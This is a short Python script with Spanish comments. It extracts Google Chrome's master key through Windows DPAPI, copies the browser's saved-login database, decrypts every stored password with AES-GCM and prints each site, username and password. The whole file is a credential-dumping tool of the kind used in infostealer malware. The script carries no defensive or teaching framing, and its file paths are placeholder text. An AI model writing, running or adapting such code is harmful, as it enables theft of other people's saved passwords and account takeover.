import sqlite3
import os
import shutil
import json
import base64
import win32crypt  # pip install pypiwin32
from Crypto.Cipher import AES  # pip install pycryptodome

def obtener_clave():
    """Obtiene la clave maestra de Chrome"""
    path = os.path.expanduser("~") + r"url the your chrome"
    with open(path, "r", encoding="utf-8") as file:
        data = json.load(file)
    key_encrypted = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]  # Elimina el prefijo "DPAPI"
    return win32crypt.CryptUnprotectData(key_encrypted, None, None, None, 0)[1]

def desencriptar_password(encrypted_password, key):
    """Desencripta la contraseña usando AES-GCM"""
    try:
        iv = encrypted_password[3:15]
        password_encrypted = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password_encrypted).decode()
    except:
        return "No se pudo descifrar"

def obtener_contraseñas_chrome():
    """Extrae y desencripta las contraseñas almacenadas en Chrome"""
    db_path = os.path.expanduser("~") + r"url the your chrome"
    db_copy = "chrome_db_copy.db"
    
    # Hacer una copia de la base de datos (Chrome la bloquea si está en uso)
    shutil.copyfile(db_path, db_copy)

    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    key = obtener_clave()
    
    for url, username, password_encrypted in cursor.fetchall():
        password = desencriptar_password(password_encrypted, key)
        print(f"Sitio: {url} | Usuario: {username} | Contraseña: {password}")

    conn.close()
    os.remove(db_copy)

# Ejecutar la función
obtener_contraseñas_chrome()
